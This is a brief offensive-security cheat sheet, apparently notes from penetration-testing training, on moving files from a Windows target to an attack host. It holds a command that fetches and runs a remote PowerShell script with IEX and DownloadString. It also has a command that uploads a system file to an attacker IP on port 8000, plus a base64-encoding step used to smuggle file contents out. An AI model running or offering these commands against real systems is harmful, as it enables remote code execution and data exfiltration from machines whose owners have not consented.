
Start upload server on attack host
```shell-session
python3 -m uploadserver
```

Install PSUpload File 
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Import-Module PSUpload.ps1
```

Upload file to attack host
```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```


Convert File to base64 string
```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
